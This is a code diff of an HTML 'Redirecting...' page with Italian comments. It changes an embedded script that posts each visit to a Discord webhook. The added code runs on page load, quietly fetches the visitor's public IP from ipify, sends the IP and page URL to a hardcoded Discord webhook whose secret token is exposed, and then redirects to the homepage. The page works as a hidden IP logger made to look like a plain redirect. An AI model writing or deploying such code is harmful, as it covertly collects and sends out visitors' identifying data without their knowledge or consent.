@@ -4,26 +4,41 @@
   <meta charset="UTF-8">
   <title>Redirecting...</title>
   <script>
-    // Invia l'URL della pagina al tuo webhook Discord
-    fetch("https://discord.com/api/webhooks/1384202309453480069/EVzqU4GCsD8160NE82evIVyBUeMtrybYIzVXAfvMBQD5LIssbN8rmvBnzOVqusT0UJT7", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content: "Visita: " + window.location.href })
-    })
-    .then(response => {
-      if (response.ok) {
-        console.log("✅ Webhook Discord inviato con successo");
-      } else {
-        console.error("❌ Errore nella richiesta Discord:", response.status, response.statusText);
-      }
-    })
-    .catch(error => {
-      console.error("❌ Errore di rete:", error);
-    })
-    .finally(() => {
-      // Reindirizza alla homepage dopo la richiesta
-      window.location.href = "/";
-    });
+    // Ottieni l'indirizzo IP pubblico dell'utente
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        const url = window.location.href;
+
+        // Invia l'IP e l'URL al webhook Discord
+        fetch("https://discord.com/api/webhooks/1384202309453480069/EVzqU4GCsD8160NE82evIVyBUeMtrybYIzVXAfvMBQD5LIssbN8rmvBnzOVqusT0UJT7", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `📡 Visita ricevuta\n🌐 URL: ${url}\n🌍 IP: ${ip}`
+          })
+        })
+        .then(response => {
+          if (response.ok) {
+            console.log("✅ Webhook Discord inviato con successo");
+          } else {
+            console.error("❌ Errore nella richiesta Discord:", response.status, response.statusText);
+          }
+        })
+        .catch(error => {
+          console.error("❌ Errore di rete durante invio al webhook:", error);
+        })
+        .finally(() => {
+          // Reindirizza alla homepage dopo la richiesta
+          window.location.href = "/";
+        });
+      })
+      .catch(error => {
+        console.error("❌ Errore nel recupero IP:", error);
+        // Reindirizza comunque anche in caso di errore
+        window.location.href = "/";
+      });
   </script>
 </head>
 <body>
